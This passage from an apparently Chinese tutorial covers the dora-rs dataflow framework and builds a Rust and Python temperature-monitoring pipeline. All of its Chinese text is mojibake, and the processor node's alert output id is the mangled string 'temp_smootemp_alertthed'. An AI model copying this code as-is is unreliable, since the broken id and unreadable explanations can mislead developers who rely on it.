            std::cerr &lt;&lt; <span class="hljs-string">"Error getting Arrow array: "</span> &lt;&lt; result.error &lt;&lt; std::endl;
            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
        }

        <span class="hljs-keyword">auto</span> result2 = arrow::<span class="hljs-built_in">ImportArray</span>(&amp;c_array, &amp;c_schema);
        <span class="hljs-keyword">if</span> (!result2.<span class="hljs-built_in">ok</span>()) {
            std::cerr &lt;&lt; <span class="hljs-string">"Error importing Arrow array: "</span> &lt;&lt; result2.<span class="hljs-built_in">status</span>().<span class="hljs-built_in">ToString</span>() &lt;&lt; std::endl;
            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
        }
        std::shared_ptr input_array = result2.<span class="hljs-built_in">ValueOrDie</span>();

        <span class="hljs-comment">// Now you can use input_array with Arrow's API</span>
    }
}
</code></pre>
<h4 data-id="heading-7">6ï¸. CLIï¼šæŒ‡æŒ¥ä¸­å¿ƒä¸‰å‰‘å®¢</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ„å»ºä¾èµ–ï¼ˆè§£æYAMLï¼Œè‡ªåŠ¨å®‰è£…/ç¼–è¯‘ï¼‰</span>
dora build pipeline.yml

<span class="hljs-comment"># å¯åŠ¨Daemonå’ŒCoordinator ï¼ˆå¦‚æœä¹‹å‰æ²¡å¯åŠ¨ï¼‰</span>
dora up

<span class="hljs-comment"># è¿è¡Œæ•°æ®æµ</span>
dora start pipeline.yml

<span class="hljs-comment"># æŸ¥çœ‹è¿è¡ŒçŠ¶æ€</span>
dora list

<span class="hljs-comment"># åœæ­¢æ‰€æœ‰è¿è¡Œä¸­çš„Dataflow</span>
dora destroy <span class="hljs-comment"># ä¸€é”®å…¨åœ</span>
</code></pre>
<h4 data-id="heading-8">7ï¸. Daemon &amp; Coordinatorï¼šå¹•åå…„å¼Ÿè¿</h4>
<ul>
<li><strong>Daemonï¼ˆå®ˆæŠ¤è¿›ç¨‹ï¼‰</strong>ï¼šå•æœºçš„"è½¦é—´ä¸»ä»»"ï¼Œç®¡ç†æœ¬åœ°èŠ‚ç‚¹ã€åˆ†é…å…±äº«å†…å­˜ã€ç›‘æ§è¿›ç¨‹å¥åº·ã€å¤„ç†æœ¬åœ°é€šä¿¡ã€‚</li>
<li><strong>Coordinatorï¼ˆåè°ƒå™¨ï¼‰</strong>ï¼šåˆ†å¸ƒå¼çš„"æ€»ç»ç†"ï¼Œåè°ƒå¤šæœºDaemonã€ç®¡ç†è·¨ç½‘ç»œè·¯ç”±ã€ç»´æŠ¤å…¨å±€çŠ¶æ€ã€‚</li>
</ul>
<p><strong>å•æœºæ¨¡å¼</strong>ï¼š<code>CLI â†’ Daemon â†’ Nodes</code><br/>
<strong>åˆ†å¸ƒå¼æ¨¡å¼</strong>ï¼š<code>CLI â†’ Coordinator â†’ å¤šDaemon â†’ Nodes</code></p>
<hr/>
<h3 data-id="heading-9">äºŒ å®æˆ˜ï¼šæ„å»ºæ··åˆè¯­è¨€çš„æ¸©åº¦ç›‘æ§ç³»ç»Ÿ</h3>
<p>é€šè¿‡æ¨¡æ‹Ÿæ¸©åº¦ä¼ æ„Ÿå™¨ã€æ•°æ®å¤„ç†ã€å¼‚å¸¸æ£€æµ‹ã€æ—¥å¿—è®°å½•å’Œå¯è§†åŒ–ï¼Œå±•ç¤º <code>dora-rs</code> çš„å¤šè¯­è¨€ã€é›¶æ‹·è´ã€åˆ†å¸ƒå¼èƒ½åŠ›ã€‚ä½¿ç”¨ rust èŠ‚ç‚¹å®ç°æ¸©åº¦ä¼ æ„Ÿå™¨ã€æ•°æ®å¤„ç†ã€å¼‚å¸¸æ£€æµ‹ï¼Œpython èŠ‚ç‚¹å®ç°å®æ—¶å¯è§†åŒ–ã€‚</p>
<h4 data-id="heading-10">é¡¹ç›®ç»“æ„</h4>
<pre><code class="hljs language-bash" lang="bash">dora-temp-monitor-rust/
â”œâ”€â”€ sensor-node/          <span class="hljs-comment"># Rust æ¸©åº¦ä¼ æ„Ÿå™¨æ¨¡æ‹ŸèŠ‚ç‚¹</span>
â”‚   â”œâ”€â”€ Cargo.toml
â”‚   â””â”€â”€ src/main.rs
â”œâ”€â”€ processor-node/       <span class="hljs-comment"># Rust æ•°æ®å¤„ç†å’Œå¼‚å¸¸æ£€æµ‹èŠ‚ç‚¹</span>
â”‚   â”œâ”€â”€ Cargo.toml
â”‚   â””â”€â”€ src/main.rs
â”œâ”€â”€ logger-node/          <span class="hljs-comment"># Rust æ—¥å¿—å’Œç»ˆç«¯å¯è§†åŒ–èŠ‚ç‚¹</span>
â”‚   â”œâ”€â”€ Cargo.toml
â”‚   â””â”€â”€ src/main.rs
â”œâ”€â”€ visualizer-node/      <span class="hljs-comment"># Python å¯è§†åŒ–èŠ‚ç‚¹</span>
â”‚   â”œâ”€â”€ .venv/
â”‚   â””â”€â”€ visualizer_node/
â”‚   â”‚   â”œâ”€â”€ __init__.py
â”‚   â”‚   â”œâ”€â”€ __main__.py
â”‚   â”‚   â””â”€â”€ main.py
â”‚   â”œâ”€â”€ pyproject.toml
â”œâ”€â”€ dataflow.yml          <span class="hljs-comment"># Dora æ•°æ®æµé…ç½®æ–‡ä»¶</span>
â””â”€â”€ Cargo.toml            <span class="hljs-comment"># Rust é¡¹ç›®ä¾èµ–ç®¡ç†</span>
</code></pre>
<h4 data-id="heading-11">1. åˆ›å»ºé¡¹ç›®</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åˆ›å»ºé¡¹ç›®, rustè¯­è¨€</span>
dora new --lang rust dora-temp-monitor-rust

<span class="hljs-comment"># åˆ é™¤é»˜è®¤åˆ›å»ºçš„èŠ‚ç‚¹</span>
<span class="hljs-built_in">rm</span> -rf listener_1 talker_1 talker_2

<span class="hljs-comment"># åˆ›å»ºè‡ªå®šä¹‰èŠ‚ç‚¹ - æ¸©åº¦ä¼ æ„Ÿå™¨æ¨¡æ‹ŸèŠ‚ç‚¹</span>
dora new --kind node  --lang rust sensor-node
<span class="hljs-comment"># Created new Rust custom node `sensor-node` at ./sensor-node</span>

<span class="hljs-comment"># åˆ›å»ºè‡ªå®šä¹‰èŠ‚ç‚¹ - æ•°æ®å¤„ç†å’Œå¼‚å¸¸æ£€æµ‹èŠ‚ç‚¹</span>
dora new --kind node  --lang rust processor-node
<span class="hljs-comment"># Created new Rust custom node `processor-node` at ./processor-node</span>
<span class="hljs-comment"># åˆ›å»ºè‡ªå®šä¹‰èŠ‚ç‚¹ - æ—¥å¿—è®°å½•å’Œç»ˆç«¯å¯è§†åŒ–èŠ‚ç‚¹</span>
dora new --kind node  --lang rust logger-node
<span class="hljs-comment"># Created new Rust custom node `logger-node` at ./logger-node</span>

<span class="hljs-comment"># åˆ›å»ºè‡ªå®šä¹‰èŠ‚ç‚¹ - Pythonå¯è§†åŒ–èŠ‚ç‚¹</span>
dora new --kind node  --lang python visualizer-node
<span class="hljs-comment"># Created new Python custom node `visualizer-node` at ./visualizer-node</span>
</code></pre>
<h4 data-id="heading-12">2. å®‰è£…uv</h4>
<p>uv æ˜¯æ–°ä¸€ä»£ Python åŒ…ç®¡ç†å™¨</p>
<pre><code class="hljs language-bash" lang="bash">cargo install uv
</code></pre>
<h4 data-id="heading-13">3. ç¼–å†™æ¸©åº¦æ¨¡æ‹Ÿä¼ æ„Ÿå™¨èŠ‚ç‚¹</h4>
<p>é€šè¿‡ <code>rand</code> crate æ¨¡æ‹Ÿæ¸©åº¦æ•°æ®, å¹¶æ·»åŠ æ­£å¼¦è¶‹åŠ¿æ¨¡æ‹ŸçœŸå®ç¯å¢ƒå˜åŒ–ã€‚</p>
<p><strong><code>sensor-node/Cargo.toml</code></strong>ï¼š</p>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-section">[package]</span>
<span class="hljs-attr">name</span> = <span class="hljs-string">"sensor_node"</span>
<span class="hljs-attr">version</span> = <span class="hljs-string">"0.1.0"</span>
<span class="hljs-attr">edition</span> = <span class="hljs-string">"2021"</span>

<span class="hljs-comment"># See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html</span>

<span class="hljs-section">[dependencies]</span>
<span class="hljs-attr">dora-node-api</span> = <span class="hljs-string">"0.3.13"</span>
<span class="hljs-attr">anyhow</span> = <span class="hljs-string">"1.0"</span>
<span class="hljs-attr">rand</span> = <span class="hljs-string">"0.9.2"</span>
</code></pre>
<p><strong><code>sensor-node/src/main.rs</code></strong>ï¼š</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> dora_node_api::{arrow::array::Float32Array, dora_core::config::DataId, DoraNode, Event};
<span class="hljs-keyword">use</span> rand::Rng;
<span class="hljs-keyword">use</span> std::error::Error;
<span class="hljs-keyword">use</span> std::time::Instant;

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;(), <span class="hljs-type">Box</span>&lt;<span class="hljs-keyword">dyn</span> Error&gt;&gt; {
    <span class="hljs-keyword">let</span> (<span class="hljs-keyword">mut</span> node, <span class="hljs-keyword">mut</span> events) = DoraNode::<span class="hljs-title function_ invoke__">init_from_env</span>()?;
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">output</span> = DataId::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">"temp_raw"</span>.<span class="hljs-title function_ invoke__">to_owned</span>());
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"ğŸŒ¡ï¸ ä¼ æ„Ÿå™¨èŠ‚ç‚¹å¯åŠ¨ (M1 Proä¼˜åŒ–ç‰ˆ)"</span>);

    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">rng</span> = rand::<span class="hljs-title function_ invoke__">rng</span>();
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">start</span> = Instant::<span class="hljs-title function_ invoke__">now</span>();

    <span class="hljs-keyword">while</span> <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">Some</span>(event) = events.<span class="hljs-title function_ invoke__">recv</span>() {
        <span class="hljs-comment">// println!("Received event: {:?}", event);</span>
        <span class="hljs-keyword">match</span> event {
            Event::Input {
                id,
                metadata,
                data: _,
            } =&gt; <span class="hljs-keyword">match</span> id.<span class="hljs-title function_ invoke__">as_str</span>() {
                <span class="hljs-string">"tick"</span> =&gt; {
                    <span class="hljs-comment">// æ¨¡æ‹Ÿå¸¦å™ªå£°çš„æ¸©åº¦æ•°æ®</span>
                    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">temp</span> = <span class="hljs-number">25.0</span>
                        + rng.<span class="hljs-title function_ invoke__">random_range</span>(-<span class="hljs-number">5.0</span>..<span class="hljs-number">5.0</span>)
                        + (start.<span class="hljs-title function_ invoke__">elapsed</span>().<span class="hljs-title function_ invoke__">as_secs_f32</span>() * <span class="hljs-number">0.01</span>).<span class="hljs-title function_ invoke__">sin</span>() * <span class="hljs-number">3.0</span>; <span class="hljs-comment">// æ·»åŠ æ­£å¼¦è¶‹åŠ¿</span>

                    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">temp_array</span> = Float32Array::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-built_in">vec!</span>[temp]);

                    node.<span class="hljs-title function_ invoke__">send_output</span>(output.<span class="hljs-title function_ invoke__">clone</span>(), metadata.parameters, temp_array)?;
                }
                other =&gt; eprintln!(<span class="hljs-string">"Received input `{other}`"</span>),
            },
            _ =&gt; {}
        }
    }

    <span class="hljs-title function_ invoke__">Ok</span>(())
}

</code></pre>
<h4 data-id="heading-14">4. ç¼–å†™æ•°æ®å¤„ç†å’Œå¼‚å¸¸æ£€æµ‹èŠ‚ç‚¹</h4>
<p>é€šè¿‡æ»‘åŠ¨çª—å£è®¡ç®—æ¸©åº¦å¹³æ»‘å€¼, å¹¶æ£€æµ‹å¼‚å¸¸å€¼ï¼ˆè¶…è¿‡é˜ˆå€¼çš„çªå˜ï¼‰ã€‚</p>
<p><strong><code>processor-node/Cargo.toml</code></strong>ï¼š</p>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-section">[package]</span>
<span class="hljs-attr">name</span> = <span class="hljs-string">"processor_node"</span>
<span class="hljs-attr">version</span> = <span class="hljs-string">"0.1.0"</span>
<span class="hljs-attr">edition</span> = <span class="hljs-string">"2021"</span>

<span class="hljs-comment"># See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html</span>

<span class="hljs-section">[dependencies]</span>
<span class="hljs-attr">dora-node-api</span> = <span class="hljs-string">"0.3.13"</span>
<span class="hljs-attr">anyhow</span> = <span class="hljs-string">"1.0"</span>

</code></pre>
<p><strong><code>processor-node/src/main.rs</code></strong>ï¼š</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> dora_node_api::{
    arrow::array::{Float32Array, StringArray},
    dora_core::config::DataId,
    DoraNode, Event,
};
<span class="hljs-keyword">use</span> std::collections::VecDeque;
<span class="hljs-keyword">use</span> std::error::Error;

<span class="hljs-keyword">struct</span> <span class="hljs-title class_">TemperatureProcessor</span> {
    window: VecDeque&lt;<span class="hljs-type">f32</span>&gt;,
    threshold: <span class="hljs-type">f32</span>, <span class="hljs-comment">// å¼‚å¸¸é˜ˆå€¼</span>
}

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">TemperatureProcessor</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">new</span>(window_size: <span class="hljs-type">usize</span>, threshold: <span class="hljs-type">f32</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> {
        <span class="hljs-keyword">Self</span> {
            window: VecDeque::<span class="hljs-title function_ invoke__">with_capacity</span>(window_size),
            threshold,
        }
    }

    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">process</span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>, temp: <span class="hljs-type">f32</span>) <span class="hljs-punctuation">-&gt;</span> (<span class="hljs-type">f32</span>, <span class="hljs-type">Option</span>&lt;<span class="hljs-type">String</span>&gt;) {
        <span class="hljs-keyword">self</span>.window.<span class="hljs-title function_ invoke__">push_back</span>(temp);
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">self</span>.window.<span class="hljs-title function_ invoke__">len</span>() &gt; <span class="hljs-number">10</span> {
            <span class="hljs-keyword">self</span>.window.<span class="hljs-title function_ invoke__">pop_front</span>();
        }

        <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">avg</span> = <span class="hljs-keyword">self</span>.window.<span class="hljs-title function_ invoke__">iter</span>().sum::&lt;<span class="hljs-type">f32</span>&gt;() / <span class="hljs-keyword">self</span>.window.<span class="hljs-title function_ invoke__">len</span>() <span class="hljs-keyword">as</span> <span class="hljs-type">f32</span>;

        <span class="hljs-comment">// å¼‚å¸¸æ£€æµ‹é€»è¾‘</span>
        <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">alert</span> = <span class="hljs-title function_ invoke__">if</span> (temp - avg).<span class="hljs-title function_ invoke__">abs</span>() &gt; <span class="hljs-keyword">self</span>.threshold {
            <span class="hljs-title function_ invoke__">Some</span>(<span class="hljs-built_in">format!</span>(
                <span class="hljs-string">"âš ï¸ æ¸©åº¦çªå˜: {:.1}Â°C (åç¦»å‡å€¼{:.1}Â°C)"</span>,
                temp,
                (temp - avg).<span class="hljs-title function_ invoke__">abs</span>()
            ))
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-literal">None</span>
        };

        (avg, alert)
    }
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;(), <span class="hljs-type">Box</span>&lt;<span class="hljs-keyword">dyn</span> Error&gt;&gt; {
    <span class="hljs-keyword">let</span> (<span class="hljs-keyword">mut</span> node, <span class="hljs-keyword">mut</span> events) = DoraNode::<span class="hljs-title function_ invoke__">init_from_env</span>()?;
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">output_temp_smoothed</span> = DataId::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">"temp_smoothed"</span>.<span class="hljs-title function_ invoke__">to_owned</span>());
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">output_temp_alert</span> = DataId::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">"temp_smootemp_alertthed"</span>.<span class="hljs-title function_ invoke__">to_owned</span>());
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"ğŸ§® å¤„ç†å™¨èŠ‚ç‚¹å¯åŠ¨ (æ»‘åŠ¨çª—å£+å¼‚å¸¸æ£€æµ‹)"</span>);

    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">processor</span> = TemperatureProcessor::<span class="hljs-title function_ invoke__">new</span>(<span class="hljs-number">10</span>, <span class="hljs-number">3.0</span>);

    <span class="hljs-keyword">while</span> <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">Some</span>(event) = events.<span class="hljs-title function_ invoke__">recv</span>() {
        <span class="hljs-keyword">match</span> event {
            Event::Input { id, metadata, data } =&gt; <span class="hljs-keyword">match</span> id.<span class="hljs-title function_ invoke__">as_str</span>() {
                <span class="hljs-string">"temp"</span> =&gt; {
                    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">array</span> = data
                        .<span class="hljs-title function_ invoke__">as_any</span>()
                        .downcast_ref::&lt;Float32Array&gt;()
                        .<span class="hljs-title function_ invoke__">ok_or</span>(<span class="hljs-string">"ç±»å‹è½¬æ¢å¤±è´¥"</span>)?;
                    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">temp</span> = array.<span class="hljs-title function_ invoke__">value</span>(<span class="hljs-number">0</span>) <span class="hljs-keyword">as</span> <span class="hljs-type">f32</span>;

                    <span class="hljs-keyword">let</span> (avg, alert) = processor.<span class="hljs-title function_ invoke__">process</span>(temp);

                    <span class="hljs-comment">// å‘é€å¹³æ»‘æ•°æ®</span>
                    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">avg_array</span> = Float32Array::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-built_in">vec!</span>[avg]);
                    node.<span class="hljs-title function_ invoke__">send_output</span>(
                        output_temp_smoothed.<span class="hljs-title function_ invoke__">clone</span>(),
                        metadata.parameters.<span class="hljs-title function_ invoke__">clone</span>(),
                        avg_array,
                    )?;

                    <span class="hljs-comment">// å¦‚æœæœ‰å¼‚å¸¸ï¼Œå‘é€è­¦æŠ¥</span>
                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">Some</span>(alert_msg) = alert {
                        <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">alert_array</span> = StringArray::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-built_in">vec!</span>[alert_msg]);
                        node.<span class="hljs-title function_ invoke__">send_output</span>(
                            output_temp_alert.<span class="hljs-title function_ invoke__">clone</span>(),
                            metadata.parameters,
                            alert_array,
                        )?;
                    }
                }
                _ =&gt; {}
            },
            _ =&gt; {}
        }
    }

    <span class="hljs-title function_ invoke__">Ok</span>(())
}

</code></pre>
<h4 data-id="heading-15">5. æ—¥å¿—èŠ‚ç‚¹ï¼ˆç»ˆç«¯å¯è§†åŒ–ï¼‰</h4>
<p>é€šè¿‡æ»‘åŠ¨çª—å£è®¡ç®—çš„å¹³æ»‘æ¸©åº¦å€¼, åœ¨ç»ˆç«¯å®æ—¶æ˜¾ç¤ºæŸ±çŠ¶å›¾, å¼‚å¸¸å€¼åˆ™ä»¥æ–‡æœ¬å½¢å¼æç¤ºã€‚</p>
<p><strong><code>logger-node/Cargo.toml</code></strong>ï¼š</p>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-section">[package]</span>
<span class="hljs-attr">name</span> = <span class="hljs-string">"logger_node"</span>
<span class="hljs-attr">version</span> = <span class="hljs-string">"0.1.0"</span>
<span class="hljs-attr">edition</span> = <span class="hljs-string">"2021"</span>

<span class="hljs-comment"># See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html</span>

<span class="hljs-section">[dependencies]</span>
<span class="hljs-attr">dora-node-api</span> = <span class="hljs-string">"0.3.13"</span>
<span class="hljs-attr">anyhow</span> = <span class="hljs-string">"1.0"</span>

</code></pre>
<p><strong><code>logger-node/src/main.rs</code></strong>ï¼š</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> dora_node_api::{
    arrow::array::{Float32Array, StringArray},
    DoraNode, Event,
};
<span class="hljs-keyword">use</span> std::error::Error;

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;(), <span class="hljs-type">Box</span>&lt;<span class="hljs-keyword">dyn</span> Error&gt;&gt; {
    <span class="hljs-keyword">let</span> (<span class="hljs-keyword">mut</span> _node, <span class="hljs-keyword">mut</span> events) = DoraNode::<span class="hljs-title function_ invoke__">init_from_env</span>()?;
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"æ—¥å¿—èŠ‚ç‚¹å¯åŠ¨"</span>);
    <span class="hljs-keyword">while</span> <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">Some</span>(event) = events.<span class="hljs-title function_ invoke__">recv</span>() {
        <span class="hljs-keyword">match</span> event {
            Event::Input {
                id,
                metadata: _,
                data,
            } =&gt; <span class="hljs-keyword">match</span> id.<span class="hljs-title function_ invoke__">as_str</span>() {
                <span class="hljs-string">"smoothed"</span> =&gt; {
                    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">array</span> = data
                        .<span class="hljs-title function_ invoke__">as_any</span>()
                        .downcast_ref::&lt;Float32Array&gt;()
                        .<span class="hljs-title function_ invoke__">ok_or</span>(<span class="hljs-string">"è½¬æ¢å¤±è´¥"</span>)?;
                    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">temp</span> = array.<span class="hljs-title function_ invoke__">value</span>(<span class="hljs-number">0</span>);

                    <span class="hljs-comment">// ç»ˆç«¯æŸ±çŠ¶å›¾ï¼ˆM1ç»ˆç«¯æ€§èƒ½å¼ºåŠ²ï¼‰</span>
                    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">bar</span> = <span class="hljs-string">"â–ˆ"</span>.<span class="hljs-title function_ invoke__">repeat</span>((temp * <span class="hljs-number">2.0</span>) <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>);
                    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"\r[{:4.1}Â°C] {}"</span>, temp, bar);
                }
                <span class="hljs-string">"alert"</span> =&gt; {
                    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">array</span> = data
                        .<span class="hljs-title function_ invoke__">as_any</span>()
                        .downcast_ref::&lt;StringArray&gt;()
                        .<span class="hljs-title function_ invoke__">ok_or</span>(<span class="hljs-string">"è½¬æ¢å¤±è´¥"</span>)?;
                    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"\nğŸš¨ {}"</span>, array.<span class="hljs-title function_ invoke__">value</span>(<span class="hljs-number">0</span>));
                }
                other =&gt; eprintln!(<span class="hljs-string">"Loggerï¼š Received input `{}`"</span>, other),
            },
            _ =&gt; {}
        }
    }

    <span class="hljs-title function_ invoke__">Ok</span>(())
}

</code></pre>
<h4 data-id="heading-16">6. ç¼–å†™å¯è§†åŒ–èŠ‚ç‚¹ï¼ˆå®æ—¶å¯è§†åŒ–ï¼‰</h4>
<p>é€šè¿‡ <code>python</code> çš„ <code>matplotlib</code> åº“, å®ç°å®æ—¶æ¸©åº¦æŸ±çŠ¶å›¾å¯è§†åŒ–ï¼Œé€šè¿‡ <code>uv</code> æ¥ç®¡ç† <code>python</code> ä¾èµ–ã€‚</p>
<p><strong><code>visualizer-node/pyproject.toml</code></strong>ï¼š</p>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-section">[project]</span>
<span class="hljs-attr">name</span> = <span class="hljs-string">"visualizer-node"</span>
<span class="hljs-attr">version</span> = <span class="hljs-string">"0.0.0"</span>
<span class="hljs-attr">authors</span> = [{ name = <span class="hljs-string">"Your Name"</span>, email = <span class="hljs-string">"email@email.com"</span> }]
<span class="hljs-attr">description</span> = <span class="hljs-string">"visualizer-node"</span>
<span class="hljs-attr">license</span> = { text = <span class="hljs-string">"MIT"</span> }
<span class="hljs-attr">readme</span> = <span class="hljs-string">"README.md"</span>
<span class="hljs-attr">requires-python</span> = <span class="hljs-string">"&gt;=3.8"</span>

<span class="hljs-attr">dependencies</span> = [
    <span class="hljs-string">"dora-rs &gt;= 0.3.9"</span>,
    <span class="hljs-string">"matplotlib&gt;=3.7.5"</span>,
    <span class="hljs-string">"pyarrow&gt;=22.0.0"</span>
]

<span class="hljs-section">[dependency-groups]</span>
<span class="hljs-attr">dev</span> = [<span class="hljs-string">"pytest &gt;=8.1.1"</span>, <span class="hljs-string">"ruff &gt;=0.9.1"</span>]

<span class="hljs-section">[tool.uv.sources]</span>
<span class="hljs-attr">default</span> = [
    { url = <span class="hljs-string">"https://mirrors.tuna.tsinghua.edu.cn/pypi/web/simple"</span> }
]

<span class="hljs-section">[project.scripts]</span>
<span class="hljs-attr">visualizer-node</span> = <span class="hljs-string">"visualizer_node.main:main"</span>

<span class="hljs-section">[tool.ruff.lint]</span>
<span class="hljs-attr">extend-select</span> = [
  <span class="hljs-string">"D"</span>,   <span class="hljs-comment"># pydocstyle</span>
  <span class="hljs-string">"UP"</span>
]

</code></pre>
<p><strong><code>visualizer-node/visualizer_node/main.py</code></strong>ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-string">"""TODO: Add docstring."""</span>

<span class="hljs-comment">#!/usr/bin/env python3</span>
<span class="hljs-comment"># visualizer.py - æ–°å¢èŠ‚ç‚¹ï¼šå®æ—¶æ¸©åº¦æ›²çº¿å›¾</span>
<span class="hljs-keyword">import</span> threading
<span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> deque

<span class="hljs-keyword">import</span> matplotlib.animation <span class="hljs-keyword">as</span> animation
<span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt
<span class="hljs-keyword">import</span> pyarrow <span class="hljs-keyword">as</span> pa
<span class="hljs-keyword">from</span> dora <span class="hljs-keyword">import</span> Node


<span class="hljs-keyword">class</span> <span class="hljs-title class_">TempVisualizer</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, max_points=<span class="hljs-number">100</span></span>):
        self.max_points = max_points
        self.timestamps = deque(maxlen=max_points)
        self.temperatures = deque(maxlen=max_points)
        self.fig, self.ax = plt.subplots(figsize=(<span class="hljs-number">10</span>, <span class="hljs-number">6</span>))
        (self.line,) = self.ax.plot([], [], <span class="hljs-string">"b-"</span>, label=<span class="hljs-string">"Temperature Curve"</span>)
        self.ax.set_ylim(<span class="hljs-number">15</span>, <span class="hljs-number">40</span>)
        self.ax.set_xlim(<span class="hljs-number">0</span>, max_points)
        self.ax.set_xlabel(<span class="hljs-string">"Timestamp"</span>)
        self.ax.set_ylabel(<span class="hljs-string">"Temperature (Â°C)"</span>)
        self.ax.set_title(<span class="hljs-string">"Real Time Temperature Monitoring (M1 Pro)"</span>)
        self.ax.legend()
        self.ax.grid(<span class="hljs-literal">True</span>)

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">update_plot</span>(<span class="hljs-params">self, frame</span>):
        self.line.set_data(<span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(self.temperatures)), self.temperatures)
        self.ax.set_xlim(<span class="hljs-number">0</span>, <span class="hljs-built_in">max</span>(<span class="hljs-built_in">len</span>(self.temperatures), self.max_points))
        <span class="hljs-keyword">return</span> (self.line,)


<span class="hljs-keyword">def</span> <span class="hljs-title function_">data_receiver</span>(<span class="hljs-params">visualizer</span>):
    <span class="hljs-string">"""åå°çº¿ç¨‹æ¥æ”¶doraæ•°æ®"""</span>

    node = Node()
    <span class="hljs-keyword">for</span> event <span class="hljs-keyword">in</span> node:
        <span class="hljs-keyword">if</span> event[<span class="hljs-string">"type"</span>] == <span class="hljs-string">"INPUT"</span> <span class="hljs-keyword">and</span> event[<span class="hljs-string">"id"</span>] == <span class="hljs-string">"data"</span>:
            array = event[<span class="hljs-string">"value"</span>]
            temp = array[<span class="hljs-number">0</span>].as_py()
            visualizer.temperatures.append(temp)
            visualizer.timestamps.append(<span class="hljs-built_in">len</span>(visualizer.timestamps))


<span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():
    visualizer = TempVisualizer()
    <span class="hljs-comment"># å¯åŠ¨æ•°æ®æ¥æ”¶çº¿ç¨‹ï¼ˆéé˜»å¡ï¼‰</span>
    data_thread = threading.Thread(target=data_receiver, args=(visualizer,))
    data_thread.daemon = <span class="hljs-literal">True</span>
    data_thread.start()

    <span class="hljs-comment"># å¯åŠ¨matplotlibåŠ¨ç”»</span>
    ani = animation.FuncAnimation(
        visualizer.fig,
        visualizer.update_plot,
        interval=<span class="hljs-number">100</span>,  <span class="hljs-comment"># 100msåˆ·æ–°ä¸€æ¬¡</span>
        blit=<span class="hljs-literal">True</span>,
    )
    plt.show()


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    main()

</code></pre>
